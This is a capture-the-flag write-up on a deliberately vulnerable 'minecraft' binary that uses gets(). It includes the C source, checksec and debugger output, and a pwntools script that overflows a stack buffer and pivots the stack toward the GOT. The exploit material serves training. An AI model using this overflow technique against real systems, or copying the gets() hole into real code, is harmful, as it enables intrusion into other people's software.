File: `chall`
```c
┌──(kali㉿kali)-[~/training_PWN/minecraft/minecraft]
└─$ checksec --file=chall
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols   FORTIFY  Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   41 Symbols  No     0               1               chall
```
Code: `chall.c`
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int read_int() {
  int x;
  if (scanf(" %d", &x) != 1) {
    puts("wtf");
    exit(1);
  }
  return x;
}

int main(void) {
  setbuf(stdout, NULL);
  while (1) {
    puts("\nM I N C E R A F T\n");
    puts("1. Singleplayer");
    puts("2. Multiplayer");
    if (read_int() != 1) {
      puts("who needs friends???");
      exit(1);
    }
    puts("Creating new world");
    puts("Enter world name:");
    char world_name[64];
    scanf(" ");
    gets(world_name);
    puts("Select game mode");
    puts("1. Survival");
    puts("2. Creative");
    if (read_int() != 1) {
      puts("only noobs play creative smh");
      exit(1);
    }
    puts("Creating new world");
    sleep(1);
    puts("25%");
    sleep(1);
    puts("50%");
    sleep(1);
    puts("75%");
    sleep(1);
    puts("100%");
    puts("\nYOU DIED\n");
    puts("you got blown up by a creeper :(");
    puts("1. Return to main menu");
    puts("2. Exit");
    if (read_int() != 1) {
      return 0;
    }
  }
}
```
* ham ``gets`` in main():
````asm
   0x000000000040125f <+163>:   lea    rax,[rbp-0x40]
   0x0000000000401263 <+167>:   mov    rdi,rax
   0x0000000000401266 <+170>:   call   0x401050 <gets@plt>
````

* stack layout:

<img width="660" height="358" alt="image" src="https://github.com/user-attachments/assets/21cc8d38-5a2c-43f1-8897-e8724a324783" />

* offset: ``[rbp - 0x40]``
````python
pwndbg> p/x 0x7fffffffdcc0 - 0x7fffffffdc80
$7 = 0x40
````

* got, writable section:
<img width="662" height="406" alt="image" src="https://github.com/user-attachments/assets/f0e16032-73ea-4c2a-b45c-5c8f5c0b9d78" />

* ``script.py``:
````python
from pwn import *

libc = ELF("./libc.so.6", checksec=False)
context.binary = exe = ELF("./chall", checksec=False)

context.log_level = "debug"

p = process(exe.path)

def GDB():
	gdb.attach(p, gdbscript='''
		br *main
		br *main+170
		br *main+175
		br *main+460

		''')
GDB()

high_addr = 0x404800
gets_addr = 0x40125f
leave_ret = 0x4011ba

p.sendlineafter(b"2. Multiplayer\n", b"1")

payload = flat(
	b"A" * 0x40,
	high_addr + 0x40,
	gets_addr
	)
p.recvuntil(b"Enter world name:\n")
p.sendline(payload)

p.recvuntil(b"Creative")
p.recvline()
p.sendline(b"1")

p.recvuntil(b"Exit")
p.recvline()
p.send(b"2")

# gets_addr send payload
payload = flat(
	b"A" * 0x40, 	 #    - 0x404800
	0x404060 + 0x40, #rbp - 0x404840
	gets_addr,       #rip - 0x404848
	0x404020 + 0x40, #rbp2- 0x404850
	gets_addr        #rip2- 0x404858
	)
p.sendline(payload)

# leave_ret to payload
p.recvuntil(b"Creative")
p.recvline()
p.sendline(b"1")

p.recvuntil(b"Exit")
p.recvline()
p.send(b"2")

payload = flat(
	# 0x404060
	0xdeadbeef,	
	0xcafebabe,
	b"A" * 0x30,
	# 0x4040a0
	high_addr + 0x50,
	leave_ret
	)
p.sendline(payload)

p.recvuntil(b"Creative")
p.recvline()
p.sendline(b"1")
p.recvuntil(b"Exit")
p.recvline()
p.send(b"2")

payload = flat(
	exe.plt.puts + 6,
	exe.plt.puts
	)
p.sendline(payload)

p.recvuntil(b"Creative")
p.recvline()
p.sendline(b"1")
p.recvuntil(b"Exit")
p.recvline()
p.send(b"2")

p.interactive()
````


____
Tai lieu:

https://sashactf.gitbook.io/pwn-notes/ctf-writeups/htb-business-2024/no-gadgets

https://motasemhamdan.medium.com/hackthebox-no-gadgets-writeup-binary-exploitation-ctf-bdd6c4984e88
